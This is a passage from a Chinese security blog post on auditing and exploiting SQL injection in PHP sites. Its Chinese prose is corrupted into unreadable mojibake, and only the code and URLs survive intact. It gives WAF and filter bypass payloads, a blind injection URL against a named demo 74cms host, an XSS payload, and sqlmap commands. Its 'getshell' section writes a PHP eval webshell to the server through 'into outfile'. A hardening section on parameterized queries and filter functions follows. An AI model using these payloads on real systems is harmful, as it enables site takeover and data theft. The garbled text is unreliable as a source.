class="hljs-string">&#x27;m&#x27;</span>])!=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;safekey&#x27;</span>])<br>&#123;<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$id</span>=&gt;<span class="hljs-variable">$v</span>)&#123;<br><span class="hljs-title function_ invoke__">safesql</span>(<span class="hljs-variable">$id</span>,<span class="hljs-variable">$v</span>,<span class="hljs-string">&quot;POST&quot;</span>,<span class="hljs-variable">$config</span>);<br><span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">sfkeyword</span>(<span class="hljs-variable">$id</span>,<span class="hljs-variable">$config</span>);<br><span class="hljs-variable">$v</span> = <span class="hljs-title function_ invoke__">sfkeyword</span>(<span class="hljs-variable">$v</span>,<span class="hljs-variable">$config</span>);<br><span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$id</span>]=<span class="hljs-title function_ invoke__">common_htmlspecialchars</span>(<span class="hljs-variable">$v</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p><strong>11. </strong> ç”±äºå…¨å±€è¿‡æ»¤å­˜åœ¨ç™½åå•é™å®šåŠŸèƒ½ï¼Œå¯ä½¿ç”¨æ— ç”¨å‚æ•°å¸¦å…¥ç»•è¿‡ã€‚</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$webscan_white_directory=<span class="hljs-string">&#x27;admin|\/dede\/|\/install\/&#x27;</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
<p>è¯·æ±‚ä¸­åŒ…å«äº†ç™½åå•å‚æ•°æ‰€ä»¥æ”¾è¡Œã€‚</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://www.target.com/index.php/dede/?m=foo&amp;c=bar&amp;id=<span class="hljs-number">1</span>&#x27; and <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select xxx<br></code></pre></td></tr></table></figure>
<p><strong>12.</strong> å­—ç¬¦ä¸²æˆªæ–­å‡½æ•°è·å–å®šé•¿æ•°æ®ï¼Œæˆªå– <code>\\</code> æˆ– <code>\â€™</code> å‰ä¸€ä½ï¼Œé—­åˆè¯­å¥ã€‚</p>
<p>åˆ©ç”¨æ¡ä»¶å¿…é¡»æ˜¯å­˜åœ¨ä¸¤ä¸ªå¯æ§å‚æ•°ï¼Œå‰é—­åˆï¼Œåæ³¨å…¥ã€‚</p>
<p><strong>13.</strong> è¿‡æ»¤äº†ç©ºæ ¼ï¼Œé€—å·çš„æ³¨å…¥ï¼Œå¯ä½¿ç”¨æ‹¬å·åŒ…è£¹ç»•è¿‡ã€‚å…·ä½“å¦‚é‡åˆ° select fromï¼ˆå…³é”®å­—ç©ºæ ¼åˆ¤æ–­çš„æ­£åˆ™ï¼Œä¸”å‰”é™¤/**/ç­‰ï¼‰å¯ä½¿ç”¨æ‹¬å·åŒ…è£¹æŸ¥è¯¢å­—æ®µç»•è¿‡ã€‚</p>
<p><strong>14.</strong> ç”±äº PHP å¼±ç±»å‹éªŒè¯æœºåˆ¶ï¼Œå¯¼è‡´ <code>==</code>ã€<code>in_array()</code> ç­‰å¯é€šè¿‡å¼ºåˆ¶è½¬æ¢ç»•è¿‡éªŒè¯ã€‚</p>
<figure>
<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SQLæ³¨å…¥å…³è”åˆ†æ-WooYun/1540348943.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload alt="update" /><figcaption aria-hidden="true">update</figcaption>
</figure>
<p><strong>15. </strong> WAF æˆ–è€…è¿‡æ»¤äº† and|or çš„æƒ…å†µå¯ä»¥ä½¿ç”¨&amp;&amp;ä¸||è¿›è¡Œç›²æ³¨ã€‚</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://demo.<span class="hljs-number">74</span>cms.com/user/user_invited.php?id=<span class="hljs-number">1</span>%<span class="hljs-number">20</span>||%<span class="hljs-number">20</span>strcmp(substr(user(),<span class="hljs-number">1</span>,<span class="hljs-number">13</span>),char(<span class="hljs-number">114</span>,<span class="hljs-number">111</span>,<span class="hljs-number">111</span>,<span class="hljs-number">116</span>,<span class="hljs-number">64</span>,<span class="hljs-number">108</span>,<span class="hljs-number">111</span>,<span class="hljs-number">99</span>,<span class="hljs-number">97</span>,<span class="hljs-number">108</span>,<span class="hljs-number">104</span>,<span class="hljs-number">111</span>,<span class="hljs-number">115</span>,<span class="hljs-number">116</span>))&amp;act=invited<br><br></code></pre></td></tr></table></figure>
<p><strong>16.</strong> windows ä¸‹ php ä¸­è®¿é—®æ–‡ä»¶åä½¿ç”¨â€&lt;â€ â€œ&gt;â€å°†ä¼šè¢«æ›¿æ¢æˆâ€*â€ â€œ?â€ï¼Œåˆ†åˆ«ä»£è¡¨ N ä¸ªä»»æ„å­—ç¬¦ä¸ 1 ä¸ªä»»æ„å­—ç¬¦ã€‚</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">file_get_contents(<span class="hljs-string">&quot;/images/&quot;</span>.$_GET[<span class="hljs-string">&#x27;a&#x27;</span>].<span class="hljs-string">&quot;.jpg&quot;</span>)<span class="hljs-comment">;</span><br><br></code></pre></td></tr></table></figure>
<p>å¯ä½¿ç”¨ <code>test.php?a=../a&lt;%00</code> è®¿é—®å¯¹åº” php æ–‡ä»¶ã€‚</p>
<p><strong>17.</strong> ä½¿ç”¨äº† urldecode æˆ–è€… rawurldecode å‡½æ•°ï¼Œåˆ™ä¼šå¯¼è‡´äºŒæ¬¡è§£ç å£°åœºå•å¼•å·è€Œå‘ç”Ÿæ³¨å…¥ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>]);<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;$a=&#x27;</span> .<span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;$b=&#x27;</span> .<span class="hljs-variable">$b</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<figure>
<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SQLæ³¨å…¥å…³è”åˆ†æ-WooYun/1540348945.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload alt="update" /><figcaption aria-hidden="true">update</figcaption>
</figure>
<p><strong>18. </strong> é€»è¾‘å¼•ç”¨ï¼Œå¯¼è‡´äºŒæ¬¡æ³¨å…¥</p>
<p>éƒ¨åˆ†ç›²ç‚¹</p>
<p>ç›²ç‚¹å¦‚ä¸‹ï¼š</p>
<ol type="1">
<li>æ³¨å…¥ç‚¹ç±»ä¼¼ id=1 è¿™ç§æ•´å‹çš„å‚æ•°å°±ä¼šå®Œå…¨æ— è§† GPC çš„è¿‡æ»¤ï¼›</li>
<li>æ³¨å…¥ç‚¹åŒ…å«é”®å€¼å¯¹çš„ï¼Œé‚£ä¹ˆè¿™é‡Œåªæ£€æµ‹äº† valueï¼Œå¯¹ key çš„è¿‡æ»¤å°±æ²¡æœ‰é˜²æŠ¤ï¼›</li>
<li>æœ‰æ—¶å€™å…¨å±€çš„è¿‡æ»¤åªè¿‡æ»¤æ‰ GETã€POST å’Œ COOKIEï¼Œä½†æ˜¯æ²¡è¿‡æ»¤ SERVERã€‚</li>
</ol>
<p>é™„å¸¸è§çš„ SERVER å˜é‡ï¼ˆå…·ä½“å«ä¹‰è‡ªè¡Œç™¾åº¦ï¼‰ï¼š</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-built_in">QUERY_STRING,</span>X_FORWARDED_FOR,CLIENT_IP,HTTP_HOST,ACCEPT_LANGUAGE<br><br></code></pre></td></tr></table></figure>
<p><em>PSï¼šè‹¥å¯¹æ³¨å…¥çš„ä»£ç å®¡è®¡æœ‰å®é™…æ“ç±»æ¼”ç»ƒï¼Œå‚è€ƒ[email protected]</em></p>
<h3 id="x06-å®‰å…¨åŠ å›º">0x06 å®‰å…¨åŠ å›º</h3>
<h4 id="æºç åŠ å›º">æºç åŠ å›º</h4>
<p><strong>1. é¢„ç¼–è¯‘å¤„ç†</strong></p>
<p>å‚æ•°åŒ–æŸ¥è¯¢æ˜¯æŒ‡åœ¨è®¾è®¡ä¸æ•°æ®åº“é“¾æ¥å¹¶è®¿é—®æ•°æ®æ—¶ï¼Œåœ¨éœ€è¦å¡«å…¥æ•°å€¼æˆ–æ•°æ®çš„åœ°æ–¹ï¼Œä½¿ç”¨å‚æ•°æ¥ç»™å€¼ã€‚åœ¨ SQL è¯­å¥ä¸­ï¼Œè¿™äº›å‚æ•°é€šå¸¸ä¸€å ä½ç¬¦æ¥è¡¨ç¤ºã€‚</p>
<p>MSSQLï¼ˆASP.NETï¼‰</p>
<p>ä¸ºäº†æé«˜ sql æ‰§è¡Œé€Ÿåº¦ï¼Œè¯·ä¸º SqlParameter å‚æ•°åŠ ä¸Š SqlDbType å’Œ size å±æ€§</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">SqlConnection conn = <span class="hljs-built_in">new</span> SqlConnection(&quot;server=(local)\\SQL2005;user id=sa;pwd=12345;initial catalog=TestDb&quot;);<br>conn.<span class="hljs-keyword">Open</span>();<br>SqlCommand cmd = <span class="hljs-built_in">new</span> SqlCommand(&quot;SELECT TOP 1 * FROM [User] WHERE UserName = @UserName AND Password = @Password&quot;);<br>cmd.<span class="hljs-keyword">Connection</span> = conn;<br>cmd.Parameters.AddWithValue(&quot;UserName&quot;, &quot;user01&quot;);<br>cmd.Parameters.AddWithValue(&quot;Password&quot;, &quot;123456&quot;);<br><br>reader = cmd.ExecuteReader();<br>reader.<span class="hljs-keyword">Read</span>();<br><span class="hljs-type">int</span> userId = reader.GetInt32(<span class="hljs-number">0</span>);<br><br>reader.<span class="hljs-keyword">Close</span>();<br>conn.<span class="hljs-keyword">Close</span>();<br><br></code></pre></td></tr></table></figure>
<p>PHP</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// å®ä¾‹åŒ–æ•°æ®æŠ½è±¡å±‚å¯¹è±¡</span><br><span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&#x27;pgsql:host=127.0.0.1;port=5432;dbname=testdb&#x27;</span>);<br><span class="hljs-comment">// å¯¹ SQL è¯­å¥æ‰§è¡Œ prepareï¼Œå¾—åˆ° PDOStatement å¯¹è±¡</span><br><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&#x27;SELECT * FROM &quot;myTable&quot; WHERE &quot;id&quot; = :id AND &quot;is_valid&quot; = :is_valid&#x27;</span>);<br><span class="hljs-comment">// ç»‘å®šå‚æ•°</span><br><span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bindValue</span>(<span class="hljs-string">&#x27;:id&#x27;</span>, <span class="hljs-variable">$id</span>);<br><span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bindValue</span>(<span class="hljs-string">&#x27;:is_valid&#x27;</span>, <span class="hljs-literal">true</span>);<br><span class="hljs-comment">// æŸ¥è¯¢</span><br><span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br><span class="hljs-comment">// è·å–æ•°æ®</span><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$stmt</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$row</span>) &#123;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$row</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>JAVA</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">java.sql.PreparedStatement prep = connection.prepareStatement(<br>&quot;<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-symbol">`users`</span> <span class="hljs-keyword">WHERE</span> USERNAME = ? <span class="hljs-keyword">AND</span> <span class="hljs-keyword">PASSWORD</span> = ?<span class="hljs-string">&quot;);</span><br><span class="hljs-string">prep.setString(1, username);</span><br><span class="hljs-string">prep.setString(2, password);</span><br><span class="hljs-string">prep.executeQuery();</span><br></code></pre></td></tr></table></figure>
<p><em>PSï¼šå°½ç®¡ SQL è¯­å¥å¤§ä½“ç›¸ä¼¼ï¼Œä½†æ˜¯åœ¨ä¸åŒæ•°æ®åº“çš„ç‰¹ç‚¹ï¼Œå¯èƒ½å‚æ•°åŒ– SQL è¯­å¥ä¸åŒï¼Œä¾‹å¦‚åœ¨ Access ä¸­å‚æ•°åŒ– SQL è¯­å¥æ˜¯åœ¨å‚æ•°ç›´æ¥ä»¥â€œ?â€ä½œä¸ºå‚æ•°åï¼Œåœ¨ SQL Server ä¸­æ˜¯å‚æ•°æœ‰â€œ@â€å‰ç¼€ï¼Œåœ¨ MySQL ä¸­æ˜¯å‚æ•°æœ‰â€œ?â€å‰ç¼€ï¼Œåœ¨ Oracle ä¸­å‚æ•°ä»¥â€œ:â€ä¸ºå‰ç¼€ã€‚</em></p>
<p><strong>2.è¿‡æ»¤å‡½æ•°çš„ä½¿ç”¨</strong></p>
<ol type="1">
<li>addslashes()</li>
<li>mysql_escape_string()</li>
<li>mysql_real_escape_string()</li>
<li>intval()</li>
</ol>
<p><strong>3.æ¡†æ¶åŠç¬¬ä¸‰æ–¹è¿‡æ»¤å‡½æ•°ä¸ç±»</strong></p>
<ol type="1">
<li>JAVA hibernate æ¡†æ¶</li>
<li>Others</li>
</ol>
<h4 id="äº§å“åŠ å›º">äº§å“åŠ å›º</h4>
<ul>
<li>Web åº”ç”¨é˜²ç«å¢™â€”â€”WAF</li>
<li>Key: äº‘ wafã€å®‰å…¨ç‹—ã€äº‘é”ã€sqlchop</li>
</ul>
<h3 id="x07-å…³è”åº”ç”¨">0x07 å…³è”åº”ç”¨</h3>
<h4 id="getshell">Getshell</h4>
<ol type="1">
<li><p>æ³¨å…¥ï¼ŒæŸ¥æ•°æ®ï¼Œæ‰¾ç®¡ç†å‘˜å¯†ç ï¼Œè¿›åå°ï¼Œæ‰¾ä¸Šä¼ ï¼Œçœ‹è¿”å›ï¼Œgetshell</p></li>
<li><p>PHP MYSQL ç±»ï¼Œå¤§æƒé™ï¼ŒçŸ¥è·¯å¾„ï¼Œä¼ æ–‡ä»¶ï¼Œå› shell(ä¸Šä¼ &amp;å‘½ä»¤æ‰§è¡Œ)ï¼ŒOS-SHELLã€‚</p></li>
<li><p>MSSQL å¤§æƒé™ï¼ŒçŸ¥è·¯å¾„ï¼Œä¼ æ–‡ä»¶ï¼Œå› shellã€‚ç»“åˆ xp_cmdshell æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p></li>
<li><p>Phpmyadmin getshell ï¼ˆç¼–ç ï¼‰</p>
<p><code>select '&lt;?eval($_POST[cmd]);?&gt;' into outfile 'd:/wwwroot/1.php';</code></p></li>
<li><p>Union select getshell</p>
<p><code>and 1=2 union select 0x3c3f70687020a6576616c28245f504f53545b615d293ba3f3e into outfile '/alidata/www/cms/ttbdxt/conf.php'--</code></p>
<p>â€‹</p></li>
</ol>
<h4 id="å…³è”åŠŸèƒ½ç‚¹">å…³è”åŠŸèƒ½ç‚¹</h4>
<table>
<thead>
<tr class="header">
<th>åºå·</th>
<th>åŠŸèƒ½ç‚¹</th>
<th>å‚æ•°</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>1</td>
<td>ç™»å½•</td>
<td>Username password</td>
</tr>
<tr class="even">
<td>2</td>
<td>Header</td>
<td>Cookie Referer x-forward remote-ip</td>
</tr>
<tr class="odd">
<td>3</td>
<td>æŸ¥è¯¢å±•ç¤º , æ•°æ®å†™å…¥ï¼ˆè¡¨å•ï¼‰ , æ•°æ®æ›´æ–°</td>
<td>id u category price str value</td>
</tr>
<tr class="even">
<td>4</td>
<td>æ•°æ®æœç´ </td>
<td>Key</td>
</tr>
<tr class="odd">
<td>5</td>
<td>ä¼ªé™æ€</td>
<td>ï¼ˆåŒ 3ï¼‰ï¼ŒåŠ *</td>
</tr>
<tr class="even">
<td>6</td>
<td>Mysql ä¸å®‰å…¨é…ç½® , <code>Set character_set_client=gbk</code></td>
<td>%df%27</td>
</tr>
<tr class="odd">
<td>7</td>
<td>ä¼ å‚ï¼ˆæ¨ªå‘æ•°æ®æµå‘ã€çºµå‘å…¥åº“æµå‘ï¼‰</td>
<td>Parameter ï¼ˆåŒ 3ï¼‰</td>
</tr>
<tr class="even">
<td>8</td>
<td>è®¢å•ç±»å¤šçº§äº¤äº’ã€é‡æ–°ç¼–è¾‘ , é…é€åœ°å€ã€èµ„æ–™ç¼–è¾‘</td>
<td>äºŒæ¬¡æ³¨å…¥</td>
</tr>
<tr class="odd">
<td>9</td>
<td>APP ä»è°ƒç”¨ WEB API</td>
<td>åŒ 3</td>
</tr>
<tr class="even">
<td>10</td>
<td>ç¼–ç  urldecode base64</td>
<td>Urldecode() rawurldecode()</td>
</tr>
</tbody>
</table>
<h2 id="è¡¥ç¼ºè¡¥æ¼">è¡¥ç¼ºè¡¥æ¼</h2>
<h3 id="ä¼ªé™æ€">ä¼ªé™æ€</h3>
<ol type="1">
<li><p><a target="_blank" rel="noopener" href="http://www.php.cn/php-weizijiaocheng-356002.html">PHP ä¼ªé™æ€çš„å›¾æ–‡ä»£ç è¯¦ç»†ä»‹ç»</a></p></li>
<li><blockquote>
<p>é™æ€ç½‘é¡µå°±æ˜¯ï¼Œæ¯”å¦‚çŸ¥ä¹ç½‘ç«™ä¸Šæ”¾äº†ä¸€ä¸ª abc.html æ–‡ä»¶ï¼Œä½ æƒ³è®¿é—®å®ƒå°±ç›´æ¥è¾“å…¥ zhihu. com/abc.htmlã€‚Web æœåŠ¡å™¨çœ‹åˆ°è¿™æ ·çš„åœ°å€å°±ç›´æ¥æ‰¾åˆ°è¿™ä¸ªæ–‡ä»¶è¾“å‡ºç»™å®¢æˆ·ç«¯ã€‚</p>
<p>åŠ¨æ€ç½‘é¡µå°±æ˜¯ï¼Œå‡å¦‚ä½ æƒ³åšä¸€ä¸ªæ˜¾ç¤ºå½“å‰æ—¶é—´çš„é¡µé¢ï¼Œé‚£ä¹ˆå°±å¯ä»¥å†™ä¸ª PHP æ–‡ä»¶ï¼Œç„¶åè®¿é—® zhihu. com/abc.phpã€‚Web æœåŠ¡å™¨çœ‹åˆ°è¿™æ ·çš„åœ°å€ï¼Œæ‰¾åˆ° abc.php è¿™ä¸ªæ–‡ä»¶ï¼Œä¼šäº¤ç»™ PHP æ‰§è¡Œåè¿”å›ç»™å®¢æˆ·ç«¯ã€‚è€ŒåŠ¨æ€ç½‘é¡µå¾€å¾€è¦è¾“å…¥å‚æ•°ï¼Œæ‰€ä»¥åœ°å€å°±å˜æˆ zhihu. com/abc.php?a=1&amp;b=2ã€‚</p>
<p>æœç´¢å¼•æ“æ¯”è¾ƒçƒ¦è¿™ç§å¸¦é—®å·çš„åŠ¨æ€ç½‘é¡µï¼Œå› ä¸ºå‚æ•°å¯ä»¥éšä¾¿åŠ ï¼Œè€Œè¿”å›å†…å®¹å´ä¸å˜ï¼Œæ‰€ä»¥ä¼šå¯¹è¿™ç§ç½‘é¡µé™æƒã€‚</p>
<p>äºæ˜¯æœ‰äº† mod_rewriteï¼Œå®ƒå¯ä»¥é‡æ–°æ˜ å°„åœ°å€ã€‚æ¯”å¦‚å½“å‰è¿™ä¸ªé¡µé¢çš„åœ°å€ htt p://www.zhihu. com/question/20153311ï¼ŒWeb æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚åä¼šé‡æ–°æ˜ å°„ä¸º www.zhihu. com/question.php?n=20153311ï¼Œç„¶åå†æ‰§è¡Œé‚£ä¸ª PHP ç¨‹åºã€‚ï¼ˆä»¥ä¸Šç½‘å€å‡ä¸ºå‡è®¾ï¼‰è¿™æ ·ï¼Œåœ¨å†…éƒ¨ä¸æ”¹å˜çš„æƒ…å†µä¸‹ï¼Œå¯¹å¤–å‘ˆç°å‡ºæ¥çš„ç½‘å€å˜æˆäº†æ²¡æœ‰é—®å·çš„è±¡é™æ€ç½‘é¡µçš„ç½‘å€ä¸€æ ·ã€‚</p>
</blockquote></li>
</ol>
<h3 id="base64-å˜å½¢">Base64 å˜å½¢</h3>
<ol type="1">
<li><p>æœç´ å¼•æ“å…³é”®è¯ï¼š<code>inurl:php?aWQ9</code></p></li>
<li><p>sqlmap å¦‚ä½•è·‘ base64 åŠ å¯†äº†çš„æ³¨å…¥ç‚¹</p>
<p>è¿™é‡Œçš„ base64 ä¸ä»…æ˜¯å€¼ä¸º base64ï¼Œå‚æ•°çš„åå­—éƒ½ä¸€èµ· base64 äº†ã€‚</p>
<p>å°†ä»¥ä¸‹ demo ä¿å­˜ä¸º sqlmap.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&quot;id=&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;http://www.xxxx.com/project_detail.php?<span class="hljs-subst">&#123;$id&#125;</span>&quot;</span>);<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p><code>sqlmap.py -u "http://localhost/sqlmap.php?id=12" -v3 --dbs</code></p>
<p>è‹¥æ˜¯ä»…æœ‰å‚æ•°å€¼è¿›è¡Œäº† base64ï¼Œé‚£ä¹ˆç”¨ sqlmap å³å¯ï¼š</p>
<p><code>sqlmap -u http://xxxx.com/index.php?tel=ltenig9yicc4occ9jzg5 --tamper base64encode.py â€“ dbs</code></p></li>
</ol>
<h3 id="ç™½ç›’å®¡è®¡">ç™½ç›’å®¡è®¡</h3>
<p><a target="_blank" rel="noopener" href="http://www.91ri.org/15074.html">æ³¨å…¥å¼•å‘çš„ç‰¹å¾ç‚¹åŠæ•æ„Ÿå‡½æ•°</a></p>
<ol type="1">
<li>PHP $_SERVER[â€™PHP_SELFâ€™]</li>
</ol>
<p>å¦‚ï¼šindex.php?str=1234 PHP_SELF æ˜¯ index.phpã€‚ä½¿ç”¨ä¸ä½†ä¼šé€ æˆ xss ä¸ sqliï¼š</p>
<p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;</span></span></span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]; <span class="hljs-meta">?&gt;</span></span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br></code></pre></td></tr></table></figure><br />
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/test.php/%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>Cscript%<span class="hljs-number">3</span>Ealert(&#x27;xss&#x27;)%<span class="hljs-number">3</span>C/script%<span class="hljs-number">3</span>E<br></code></pre></td></tr></table></figure></p>
<ol start="2" type="1">
<li><p>$_SERVER[â€˜QUERY_STRINGâ€™]</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">$_SERVER[â€™REQUEST_URIâ€™]ä¼šåŸå°ä¸åŠ¨çš„åæ˜ ç½‘å€æœ¬èº«ï¼Œç½‘å€ä¸­å¦‚æœæœ‰%3Cï¼Œé‚£ä¹ˆä½ å¾—åˆ°çš„ä¹Ÿå°†ä¼šæ˜¯%3Cï¼Œè€Œ$ _SERVER[â€™PHP_SELFâ€™]ä¼šå¯¹ç½‘å€è¿›è¡Œä¸€æ¬¡urldecodeæ“ä½œï¼Œç½‘å€ä¸­çš„%3Cå°†ä¼šå˜æˆå­—ç¬¦â€œ&lt;â€ï¼Œæ‰€ä»¥å°±äº§ç”Ÿäº†æ¼æ´ã€‚<br></code></pre></td></tr></table></figure></li>
<li><p>æœªå®šä¹‰å¸¸é‡</p></li>
</ol>
<p><code>if(IN_ADMIN != TRUE)</code> ç­‰å¼ä¸æˆç«‹ï¼Œé <code>0</code>ã€<code>null</code> éƒ½ä¸º <code>true</code></p>
<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(IN_ADMIN == <span class="hljs-literal">TRUE</span>)<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;string&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//è¾“å‡º string</span><br></code></pre></td></tr></table></figure></p>
<ol start="4" type="1">
<li>PHP ä¸­è‡ªç¼–å†™å¯¹æ ‡ç­¾çš„è¿‡æ»¤</li>
</ol>
<p>PHP ä¸­è‡ªç¼–å†™å¯¹æ ‡ç­¾çš„è¿‡æ»¤æˆ–å…³é”®å­—è¿‡æ»¤ï¼Œåº”æ”¾åœ¨ strip_tags ç­‰å»é™¤å‡½æ•°ä¹‹åï¼Œå¦åˆ™å¼•èµ·è¿‡æ»¤ç»•è¿‡ã€‚</p>
<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkSQLi</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-string">&quot;select&quot;</span>, <span class="hljs-variable">$string</span>))&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">mystrip_tags</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">checkSQLi</span>(<span class="hljs-variable">$string</span>))&#123;<br>        <span 